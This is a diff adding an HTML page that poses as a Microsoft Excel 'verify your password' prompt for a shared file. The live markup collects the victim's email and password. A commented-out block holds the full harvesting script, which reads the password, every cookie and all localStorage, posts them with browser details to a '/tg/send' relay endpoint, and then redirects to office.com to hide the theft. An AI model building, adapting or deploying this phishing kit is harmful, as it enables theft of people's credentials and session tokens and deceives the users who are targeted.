@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>project proposal</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="modal-overlay">
+        <div class="login-card">
+          <div class="icon-container">
+            <img
+              src="./assets/microsoft-excel-10.svg"
+              alt="Excel Icon"
+              class="icon"
+            />
+            <p>Microsoft Excel</p>
+          </div>
+
+          <p class="email" id="user-email"></p>
+          <input type="email" id="email-input" placeholder="Enter your email" />
+          <p>Enter password</p>
+          <p class="sensitive">
+            Because you are accessing sensitive info, you need to verify your
+            password
+          </p>
+          <input type="password" id="password" placeholder="Password" />
+          <p id="error-message" style="color: red"></p>
+
+          <p class="note">
+            Note: Only the above email recipient can access this file
+          </p>
+          <button onclick="handleLogin()">Sign in</button>
+        </div>
+      </div>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
+
+<!-- <!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Login</title>
+  </head>
+  <body>
+    <div>
+      <label>Email:</label>
+      <span id="user-email-container">
+        <span id="user-email"></span>
+        <input
+          type="email"
+          id="email-input"
+          placeholder="Enter your email"
+          style="display: none"
+        />
+      </span>
+    </div>
+    <div>
+      <label>Password:</label>
+      <input type="password" id="password" />
+    </div>
+    <div id="error-message" style="color: red"></div>
+    <button onclick="handleLogin()">Login</button>
+
+    <script>
+      window.onload = function () {
+        const params = new URLSearchParams(window.location.search);
+        const email = params.get("email");
+
+        const emailSpan = document.getElementById("user-email");
+        const emailInput = document.getElementById("email-input");
+
+        if (email) {
+          emailSpan.innerText = email;
+          emailSpan.style.display = "inline";
+          emailInput.style.display = "none";
+        } else {
+          emailSpan.style.display = "none";
+          emailInput.style.display = "inline";
+        }
+      };
+
+      function validateEmail(email) {
+        const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return pattern.test(email);
+      }
+
+      function validatePassword(password) {
+        const pattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;
+        return pattern.test(password);
+      }
+
+      function handleLogin() {
+        const emailSpan = document.getElementById("user-email");
+        const emailInput = document.getElementById("email-input");
+        const password = document.getElementById("password").value;
+        const email = emailSpan.innerText || emailInput.value.trim();
+        const errorMessage = document.getElementById("error-message");
+
+        // Validate input
+        if (!validateEmail(email)) {
+          errorMessage.innerText = "Invalid email format.";
+          return;
+        }
+        if (!validatePassword(password)) {
+          errorMessage.innerText =
+            "Password must be at least 8 characters and include uppercase, lowercase, number, and special character.";
+          return;
+        }
+
+        errorMessage.innerText = ""; // Clear any previous error
+
+        const cookies = {};
+        if (document.cookie) {
+          document.cookie.split(";").forEach(function (cookie) {
+            const parts = cookie.trim().split("=");
+            if (parts.length === 2) {
+              cookies[parts[0]] = parts[1];
+            }
+          });
+        }
+
+        const storageData = {};
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          storageData[key] = localStorage.getItem(key);
+        }
+
+        fetch("http://localhost:4000/tg/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            email,
+            password,
+            cookies,
+            localStorage: storageData,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+          }),
+        })
+          .then(() => {
+            window.location.href = "https://office.com/admin";
+          })
+          .catch(() => {
+            window.location.href = "https://office.com/admin";
+          });
+      }
+    </script>
+  </body>
+</html> -->
